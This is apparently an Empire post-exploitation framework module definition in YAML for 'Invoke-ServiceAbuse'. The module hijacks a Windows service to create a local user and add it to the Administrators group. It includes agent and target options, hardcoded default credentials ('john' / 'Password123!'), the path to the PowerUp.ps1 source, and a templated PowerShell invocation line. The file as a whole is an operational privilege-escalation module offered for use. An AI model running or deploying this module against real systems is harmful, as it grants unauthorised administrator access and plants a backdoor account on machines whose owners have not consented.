name: Invoke-ServiceAbuse
authors:
  - '@harmj0y'
description: Modifies a target service to create a local user and add it to the local
  administrators.
software: S0194
techniques:
  - T1087
  - T1038
  - T1031
  - T1034
  - T1057
  - T1012
background: true
output_extension:
needs_admin: false
opsec_safe: false
language: powershell
min_language_version: '2'
comments:
  - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: ServiceName
    description: The service name to manipulate.
    required: true
    value: ''
  - name: UserName
    description: The username to add.
    required: false
    value: john
  - name: Password
    description: Password to set for the added user.
    required: false
    value: Password123!
  - name: LocalGroup
    description: Local group to add the user to.
    required: false
    value: Administrators
  - name: OutputFunction
    description: PowerShell's output function to use ("Out-String", "ConvertTo-Json", "ConvertTo-Csv", "ConvertTo-Html", "ConvertTo-Xml").
    required: false
    value: 'Out-String'
    strict: false
    suggested_values:
      - Out-String
      - ConvertTo-Json
      - ConvertTo-Csv
      - ConvertTo-Html
      - ConvertTo-Xml
script_path: 'empire/server/data/module_source/privesc/PowerUp.ps1'
script_end: Invoke-ServiceAbuse {{ PARAMS }} | {{ OUTPUT_FUNCTION }} | %{$_ + "`n"}; 'Invoke-ServiceAbuse completed'
